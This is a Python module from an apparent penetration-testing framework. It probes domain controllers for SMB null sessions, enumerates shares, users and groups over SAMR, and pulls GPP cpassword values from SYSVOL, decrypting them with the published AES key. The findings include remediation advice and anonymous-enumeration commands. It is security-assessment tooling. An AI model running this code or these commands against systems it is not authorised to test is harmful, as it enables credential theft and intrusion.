"""Null session module — SMB null session enumeration.

Probes for unauthenticated SMB access and enumerates:
- Shares with READ/WRITE access testing
- Domain users and groups via SAMR null session
- SYSVOL/NETLOGON GPP credential exposure (MS14-025)
- Dangerous share access (C$, ADMIN$, SYSVOL, NETLOGON)

MITRE ATT&CK:
  T1552.006 (Group Policy Preferences credentials)
  T1135     (Network Share Discovery)
  T1069.002 (Permission Groups Discovery — Domain Groups)
  T1087.002 (Account Discovery — Domain Account)
"""
from __future__ import annotations

import asyncio
import hashlib
import re
import socket
import struct
import sys
import time
import unittest
from pathlib import Path
from typing import Any

sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent))

from common.base_module import BaseModule, ModuleResult
from common.evidence import Evidence
from common.finding import Severity

# ---------------------------------------------------------------------------
# CVSS vectors
# ---------------------------------------------------------------------------
CVSS_GPP_V31     = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"
CVSS_GPP_V40     = "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N"
CVSS_SYSVOL_V31  = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
CVSS_SYSVOL_V40  = "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N"
CVSS_NULL_V31    = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"
CVSS_NULL_V40    = "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N"
CVSS40_NULL_SESSION = CVSS_NULL_V40   # backward-compat alias

# AES-256 key used by Microsoft to encrypt GPP cpassword values (MS14-025)
# Published by Microsoft in MS Security Advisory 2962486 / KB2962486
_GPP_AES_KEY = bytes([
    0x4e, 0x99, 0x06, 0xe8, 0xfc, 0xb6, 0x6c, 0xc9,
    0xfa, 0xf4, 0x93, 0x10, 0x62, 0x0f, 0xfe, 0xe8,
    0xf4, 0x96, 0xe8, 0x06, 0xcc, 0x05, 0x79, 0x90,
    0x20, 0x9b, 0x09, 0xa4, 0x33, 0xb6, 0x6c, 0x1b,
])

# Shares that indicate privileged access or sensitive content
_DANGEROUS_SHARE_PATTERNS = {
    "SYSVOL":  ("HIGH",    "GPO exposure — scripts and policies readable"),
    "NETLOGON": ("HIGH",   "Logon scripts accessible — potential password exposure"),
    "C$":       ("HIGH",   "Administrative share C$ readable without credentials"),
    "ADMIN$":   ("HIGH",   "ADMIN$ administrative share readable without credentials"),
    "IPC$":     ("MEDIUM", "IPC$ null session — RPC endpoints enumerable"),
}


class NullSession(BaseModule):
    """SMB null session enumeration — shares, users, groups, and GPP creds."""

    NAME        = "null_session"
    DESCRIPTION = "Test for SMB null session: shares, SAMR user/group enum, GPP credential extraction"
    PHASE       = 1
    TAGS        = ["unauth", "null-session", "smb", "cwe-306"]

    async def run(self) -> ModuleResult:
        start  = time.monotonic()
        dc_ip  = self.config.extra.get("dc", self.config.target)
        domain = self.config.extra.get("domain", "")

        if not self.check_scope(dc_ip):
            return self._make_result(start, skipped=True, skip_reason="out of scope")

        null_ok = self._try_smb_null(dc_ip)
        shares: list[dict]  = []
        users: list[str]    = []
        groups: list[str]   = []
        gpo_passwords: list[dict] = []
        dangerous: list[dict] = []

        if null_ok:
            shares    = self._enum_shares(dc_ip)
            dangerous = self._check_dangerous_shares(shares)
            users     = self._enum_users_via_samr(dc_ip)
            groups    = self._enum_groups_via_samr(dc_ip)
            # Check SYSVOL for GPP cpassword
            sysvol_readable = any(
                s.get("name", "").upper() in ("SYSVOL", "NETLOGON")
                for s in shares
                if s.get("readable")
            )
            if sysvol_readable:
                gpo_passwords = self._extract_gpo_passwords(dc_ip)

        self._emit_findings(dc_ip, domain, null_ok, shares, users, groups,
                            gpo_passwords, dangerous)
        return self._make_result(start)

    # ------------------------------------------------------------------
    # Null session probe
    # ------------------------------------------------------------------

    def _try_smb_null(self, host: str) -> bool:
        """Attempt SMB null session; return True when listShares() succeeds."""
        try:
            with socket.create_connection((host, 445), timeout=1):
                pass
        except OSError:
            return False
        smb = None
        try:
            from impacket.smbconnection import SMBConnection
            smb = SMBConnection(host, host, timeout=10, manualNegotiate=True)
            smb.negotiateSession()
            smb.login("", "")  # empty credentials = null session
            smb.listShares()   # raises if access denied
            self.log.info("SMB null session established on %s", host)
            return True
        except ImportError:
            self.log.debug("impacket not installed — cannot probe SMB null session")
        except Exception as exc:
            self.log.debug("SMB null session failed on %s: %s", host, exc)
        finally:
            if smb is not None:
                try:
                    smb.close()
                except Exception:
                    pass
        return False

    # ------------------------------------------------------------------
    # Share enumeration
    # ------------------------------------------------------------------

    def _enum_shares(self, host: str) -> list[dict]:
        """List available shares and test READ/WRITE access for each."""
        shares: list[dict] = []
        try:
            from impacket.smbconnection import SMBConnection
            smb = SMBConnection(host, host, timeout=10)
            smb.login("", "")
            raw_shares = smb.listShares()
            for s in raw_shares:
                name = s["shi1_netname"].rstrip("\x00")
                stype = int(s["shi1_type"])
                entry: dict[str, Any] = {
                    "name":     name,
                    "type":     stype,
                    "readable": False,
                    "writable": False,
                }
                # Test read access
                try:
                    smb.listPath(name, "*")
                    entry["readable"] = True
                except Exception:
                    pass
                # Test write access (create then delete a marker file)
                if entry["readable"]:
                    marker = f"forge_probe_{hashlib.sha256(name.encode()).hexdigest()[:8]}.tmp"
                    try:
                        tid = smb.connectTree(name)
                        fid = smb.createFile(tid, f"\\{marker}")
                        smb.closeFile(tid, fid)
                        smb.deleteFiles(name, f"\\{marker}")
                        entry["writable"] = True
                    except Exception:
                        pass
                shares.append(entry)
            smb.logoff()
        except Exception as exc:
            self.log.debug("Share enumeration failed: %s", exc)
        return shares

    # ------------------------------------------------------------------
    # SAMR enumeration
    # ------------------------------------------------------------------

    def _enum_users_via_samr(self, host: str) -> list[str]:
        """Enumerate domain users via SAMR over null session (SAMRDump equivalent)."""
        users: list[str] = []
        try:
            from impacket.dcerpc.v5 import transport as imp_transport, samr
            from impacket.dcerpc.v5.dtypes import MAXIMUM_ALLOWED

            string_binding = r"ncacn_np:%s[\pipe\samr]" % host
            rpctransport   = imp_transport.DCERPCTransportFactory(string_binding)
            rpctransport.set_credentials("", "", "", "", "")
            dce = rpctransport.get_dce_rpc()
            dce.connect()
            dce.bind(samr.MSRPC_UUID_SAMR)

            resp       = samr.hSamrConnect(dce, host + "\x00", MAXIMUM_ALLOWED)
            server_hdl = resp["ServerHandle"]

            resp2   = samr.hSamrEnumerateDomainsInSamServer(dce, server_hdl)
            domains = resp2["Buffer"]["Buffer"]

            for dom_entry in domains:
                dom_name = dom_entry["Name"]
                if dom_name.upper() == "BUILTIN":
                    continue
                resp3   = samr.hSamrLookupDomainInSamServer(dce, server_hdl, dom_name)
                resp4   = samr.hSamrOpenDomain(dce, server_hdl, MAXIMUM_ALLOWED, resp3["DomainId"])
                dom_hdl = resp4["DomainHandle"]

                # Enumerate users
                enumeration_context = 0
                while True:
                    try:
                        resp5 = samr.hSamrEnumerateUsersInDomain(
                            dce, dom_hdl, enumerationContext=enumeration_context
                        )
                        for user in resp5["Buffer"]["Buffer"]:
                            users.append(str(user["Name"]))
                        if resp5["EnumerationContext"] == 0:
                            break
                        enumeration_context = resp5["EnumerationContext"]
                    except Exception:
                        break

                samr.hSamrCloseHandle(dce, dom_hdl)

            samr.hSamrCloseHandle(dce, server_hdl)
            dce.disconnect()
        except ImportError:
            self.log.debug("impacket not available for SAMR user enumeration")
        except Exception as exc:
            self.log.debug("SAMR user enumeration failed: %s", exc)
        return users

    def _enum_groups_via_samr(self, host: str) -> list[str]:
        """Enumerate domain groups via SAMR over null session."""
        groups: list[str] = []
        try:
            from impacket.dcerpc.v5 import transport as imp_transport, samr
            from impacket.dcerpc.v5.dtypes import MAXIMUM_ALLOWED

            string_binding = r"ncacn_np:%s[\pipe\samr]" % host
            rpctransport   = imp_transport.DCERPCTransportFactory(string_binding)
            rpctransport.set_credentials("", "", "", "", "")
            dce = rpctransport.get_dce_rpc()
            dce.connect()
            dce.bind(samr.MSRPC_UUID_SAMR)

            resp       = samr.hSamrConnect(dce, host + "\x00", MAXIMUM_ALLOWED)
            server_hdl = resp["ServerHandle"]
            resp2      = samr.hSamrEnumerateDomainsInSamServer(dce, server_hdl)
            domains    = resp2["Buffer"]["Buffer"]

            for dom_entry in domains:
                dom_name = dom_entry["Name"]
                resp3    = samr.hSamrLookupDomainInSamServer(dce, server_hdl, dom_name)
                resp4    = samr.hSamrOpenDomain(dce, server_hdl, MAXIMUM_ALLOWED, resp3["DomainId"])
                dom_hdl  = resp4["DomainHandle"]

                enumeration_context = 0
                while True:
                    try:
                        resp5 = samr.hSamrEnumerateGroupsInDomain(
                            dce, dom_hdl, enumerationContext=enumeration_context
                        )
                        for grp in resp5["Buffer"]["Buffer"]:
                            groups.append(str(grp["Name"]))
                        if resp5["EnumerationContext"] == 0:
                            break
                        enumeration_context = resp5["EnumerationContext"]
                    except Exception:
                        break

                samr.hSamrCloseHandle(dce, dom_hdl)
            samr.hSamrCloseHandle(dce, server_hdl)
            dce.disconnect()
        except Exception as exc:
            self.log.debug("SAMR group enumeration failed: %s", exc)
        return groups

    # ------------------------------------------------------------------
    # Dangerous share detection
    # ------------------------------------------------------------------

    def _check_dangerous_shares(self, shares: list[dict]) -> list[dict]:
        """Flag known-dangerous shares that are accessible."""
        dangerous: list[dict] = []
        for share in shares:
            name = share.get("name", "").upper()
            if name in _DANGEROUS_SHARE_PATTERNS and (share.get("readable") or name == "IPC$"):
                sev, reason = _DANGEROUS_SHARE_PATTERNS[name]
                dangerous.append({
                    "name":     name,
                    "severity": sev,
                    "reason":   reason,
                    "readable": share.get("readable", False),
                    "writable": share.get("writable", False),
                })
        return dangerous

    # ------------------------------------------------------------------
    # GPP credential extraction (MS14-025)
    # ------------------------------------------------------------------

    def _extract_gpo_passwords(self, host: str) -> list[dict]:
        """Search SYSVOL for Groups.xml files containing cpassword."""
        found: list[dict] = []
        try:
            from impacket.smbconnection import SMBConnection
            smb = SMBConnection(host, host, timeout=10)
            smb.login("", "")

            for share in ("SYSVOL", "NETLOGON"):
                try:
                    self._search_share_for_gpp(smb, share, "\\", found)
                except Exception:
                    pass

            smb.logoff()
        except Exception as exc:
            self.log.debug("GPP extraction failed: %s", exc)
        return found

    def _search_share_for_gpp(
        self,
        smb: Any,
        share: str,
        path: str,
        results: list[dict],
        depth: int = 0,
    ) -> None:
        """Recursively walk *share*/*path* looking for Groups.xml."""
        if depth > 8:
            return
        try:
            entries = smb.listPath(share, path + "*")
            for entry in entries:
                name = entry.get_longname()
                if name in (".", ".."):
                    continue
                full_path = path + name
                if entry.is_directory():
                    self._search_share_for_gpp(smb, share, full_path + "\\", results, depth + 1)
                elif name.lower() in ("groups.xml", "scheduledtasks.xml",
                                      "services.xml", "datasources.xml",
                                      "drives.xml", "printers.xml"):
                    content = self._read_smb_file(smb, share, full_path)
                    if content:
                        creds = self._parse_gpp_xml(content, full_path)
                        results.extend(creds)
        except Exception:
            pass

    def _read_smb_file(self, smb: Any, share: str, path: str) -> str:
        """Read a file from an SMB share via null session."""
        try:
            buf = b""
            tid = smb.connectTree(share)
            fid = smb.openFile(tid, path)
            offset = 0
            while True:
                chunk = smb.readFile(tid, fid, offset, 65535)
                if not chunk:
                    break
                buf   += chunk
                offset += len(chunk)
            smb.closeFile(tid, fid)
            return buf.decode("utf-8", errors="replace")
        except Exception:
            return ""

    def _parse_gpp_xml(self, content: str, source_path: str) -> list[dict]:
        """Extract and decrypt cpassword values from a GPP XML file."""
        creds: list[dict] = []
        # Match cpassword="..." anywhere in the XML
        for m in re.finditer(r'cpassword="([^"]+)"', content, re.IGNORECASE):
            cpassword = m.group(1)
            if not cpassword:
                continue
            plaintext = self._decrypt_cpassword(cpassword)
            # Try to extract userName near cpassword
            username_m = re.search(r'userName="([^"]+)"', content, re.IGNORECASE)
            username = username_m.group(1) if username_m else "unknown"
            creds.append({
                "source":     source_path,
                "username":   username,
                "cpassword":  cpassword,
                "plaintext":  plaintext,
            })
        return creds

    @staticmethod
    def _decrypt_cpassword(cpassword: str) -> str:
        """Decrypt a GPP cpassword using the published Microsoft AES-256 key."""
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
            from cryptography.hazmat.backends import default_backend
            import base64

            # Add padding if needed
            padding = 4 - len(cpassword) % 4
            if padding != 4:
                cpassword += "=" * padding

            ciphertext = base64.b64decode(cpassword)
            iv         = b"\x00" * 16  # IV is all zeros for GPP
            cipher     = Cipher(
                algorithms.AES(_GPP_AES_KEY),
                modes.CBC(iv),
                backend=default_backend(),
            )
            decryptor  = cipher.decryptor()
            plaintext  = decryptor.update(ciphertext) + decryptor.finalize()
            # Remove PKCS7 padding and decode UTF-16LE
            pad_len = plaintext[-1]
            if isinstance(pad_len, int) and 1 <= pad_len <= 16:
                plaintext = plaintext[:-pad_len]
            return plaintext.decode("utf-16-le", errors="replace").strip("\x00")
        except Exception:
            # Fallback: return raw cpassword if decryption fails
            return f"<decryption failed — raw: {cpassword[:20]}...>"

    # ------------------------------------------------------------------
    # Findings emitter
    # ------------------------------------------------------------------

    def _emit_findings(
        self,
        host: str,
        domain: str,
        null_session_works: bool,
        shares: list[dict],
        users: list[str],
        groups: list[str],
        gpo_passwords: list[dict],
        dangerous: list[dict],
    ) -> None:
        if not null_session_works:
            return

        if gpo_passwords:
            ev = Evidence(
                request_raw="SYSVOL null session read → Groups.xml cpassword extraction",
                response_raw="\n".join(
                    f"File: {c['source']} | User: {c['username']} | Plain: {c['plaintext']}"
                    for c in gpo_passwords
                ),
                extra={"credentials": gpo_passwords},
            )
            self.new_finding(
                title=f"GPP Plaintext Credentials Found (MS14-025) — {host}",
                severity=Severity.CRITICAL,
                description=(
                    f"SYSVOL on {host} is readable via null session and contains "
                    f"{len(gpo_passwords)} GPP credential(s) in Groups.xml (or similar). "
                    "The cpassword AES key is publicly known (MS14-025). "
                    "Accounts: " + ", ".join(c["username"] for c in gpo_passwords[:5])
                ),
                reproduction_steps=[
                    f"smbclient //{host}/SYSVOL -N",
                    "find . -name 'Groups.xml' | xargs grep -l cpassword",
                    "python3 -c \"from impacket.examples.secretsdump import ...\"; "
                    "# or use Get-GPPPassword.ps1 / gpp-decrypt",
                ],
                remediation=(
                    "Delete all Groups.xml files containing cpassword from SYSVOL. "
                    "Immediately reset all affected accounts. "
                    "Apply MS14-025 / KB2962486 to all DCs. "
                    "Use LAPS for local admin password management instead of GPP."
                ),
                references=["CVE-2014-1812", "MS14-025", "MITRE T1552.006"],
                evidence=ev,
                cvss_v31_vector=CVSS_GPP_V31,
                cvss_v40_vector=CVSS_GPP_V40,
                mitre_attack=["TA0006/T1552.006"],
                target=host,
            )

        sysvol_readable = any(
            d["name"] in ("SYSVOL", "NETLOGON") and d.get("readable")
            for d in dangerous
        )
        if sysvol_readable and users:
            ev = Evidence(
                request_raw="SMB null session → SAMR enumeration + SYSVOL access",
                response_raw=(
                    f"Users ({len(users)}): " + ", ".join(users[:20]) + "\n"
                    f"Groups ({len(groups)}): " + ", ".join(groups[:10])
                ),
                extra={
                    "users":  users,
                    "groups": groups,
                    "shares": [s["name"] for s in shares],
                },
            )
            self.new_finding(
                title=f"Null Session — SYSVOL Readable + Domain User Enumeration ({host})",
                severity=Severity.HIGH,
                description=(
                    f"SMB null session is permitted on {host}. "
                    f"SYSVOL/NETLOGON is readable and {len(users)} domain user(s) "
                    f"and {len(groups)} group(s) were enumerated without credentials. "
                    "Sample users: " + ", ".join(users[:10])
                ),
                reproduction_steps=[
                    f"smbclient -L //{host} -N",
                    f"smbclient //{host}/SYSVOL -N",
                    f"rpcclient -U '' -N {host} -c enumdomusers",
                    f"crackmapexec smb {host} -u '' -p '' --users --shares",
                ],
                remediation=(
                    "Set RestrictAnonymous=1 or 2 in registry. "
                    "Restrict SYSVOL ACLs to authenticated users only. "
                    "Block TCP 445 from untrusted networks."
                ),
                references=["CWE-306", "MITRE T1135", "MITRE T1087.002"],
                evidence=ev,
                cvss_v31_vector=CVSS_SYSVOL_V31,
                cvss_v40_vector=CVSS_SYSVOL_V40,
                mitre_attack=["TA0007/T1135", "TA0007/T1087.002"],
                target=host,
            )

        elif null_session_works:
            share_names = [s.get("name", "") for s in shares]
            ev = Evidence(
                request_raw="SMB null session login",
                response_raw=f"Shares: {', '.join(share_names)}",
                extra={"shares": shares, "dangerous": dangerous},
            )
            self.new_finding(
                title=f"SMB Null Session Permitted — {host}",
                severity=Severity.MEDIUM,
                description=(
                    f"SMB null session accepted on {host}. "
                    f"Accessible shares: {', '.join(share_names) or 'none listed'}. "
                    + (f"Dangerous shares found: {', '.join(d['name'] for d in dangerous)}."
                       if dangerous else "")
                ),
                reproduction_steps=[
                    f"smbclient -L //{host} -N",
                    f"rpcclient -U '' -N {host} -c srvinfo",
                ],
                remediation=(
                    "Set RestrictAnonymous=1 in the registry. "
                    "Apply 'Network access: Do not allow anonymous enumeration of SAM accounts and shares' GPO."
                ),
                references=["CWE-306", "MITRE T1135"],
                evidence=ev,
                cvss_v31_vector=CVSS_NULL_V31,
                cvss_v40_vector=CVSS_NULL_V40,
                mitre_attack=["TA0007/T1135"],
                target=host,
            )


# ---------------------------------------------------------------------------
# Embedded tests
# ---------------------------------------------------------------------------

class TestNullSession(unittest.TestCase):

    def test_phase(self):
        assert NullSession.PHASE == 1

    def test_name(self):
        assert NullSession.NAME == "null_session"

    def test_tags(self):
        assert "smb" in NullSession.TAGS
        assert "null-session" in NullSession.TAGS

    def test_cvss_gpp_is_critical(self):
        assert "C:H" in CVSS_GPP_V31
        assert "I:H" in CVSS_GPP_V31

    def test_cvss_vector_starts_correctly(self):
        assert CVSS_NULL_V31.startswith("CVSS:3.1")
        assert CVSS_GPP_V40.startswith("CVSS:4.0")

    def test_gpp_aes_key_length(self):
        assert len(_GPP_AES_KEY) == 32

    def test_dangerous_share_patterns_contain_sysvol(self):
        assert "SYSVOL" in _DANGEROUS_SHARE_PATTERNS

    def test_dangerous_share_patterns_contain_netlogon(self):
        assert "NETLOGON" in _DANGEROUS_SHARE_PATTERNS

    def test_decrypt_cpassword_no_cryptography(self):
        """Gracefully returns fallback string when decryption lib missing."""
        mod = NullSession.__new__(NullSession)
        result = NullSession._decrypt_cpassword("AAAAAAAAAAAAAAAA")
        assert isinstance(result, str)

    def test_check_dangerous_shares_empty(self):
        mod = NullSession.__new__(NullSession)
        mod.log = type("L", (), {"debug": lambda *a, **k: None})()
        result = mod._check_dangerous_shares([])
        assert result == []

    def test_check_dangerous_shares_flags_sysvol(self):
        mod = NullSession.__new__(NullSession)
        mod.log = type("L", (), {"debug": lambda *a, **k: None})()
        shares = [{"name": "SYSVOL", "readable": True, "writable": False}]
        result = mod._check_dangerous_shares(shares)
        assert len(result) == 1
        assert result[0]["name"] == "SYSVOL"
        assert result[0]["severity"] == "HIGH"

    def test_parse_gpp_xml_extracts_cpassword(self):
        mod = NullSession.__new__(NullSession)
        xml = '<Properties userName="svc_deploy" cpassword="AzVJmXh6KX7KR6qMZLRvLA==" />'
        creds = mod._parse_gpp_xml(xml, "\\SYSVOL\\Policies\\...\\Groups.xml")
        assert len(creds) == 1
        assert creds[0]["username"] == "svc_deploy"
        assert creds[0]["cpassword"] == "AzVJmXh6KX7KR6qMZLRvLA=="

    def test_try_smb_null_no_server(self):
        mod = NullSession.__new__(NullSession)
        mod.log = type("L", (), {
            "info": lambda *a, **k: None,
            "debug": lambda *a, **k: None,
        })()
        assert mod._try_smb_null("127.0.0.1") is False


if __name__ == "__main__":
    unittest.main()
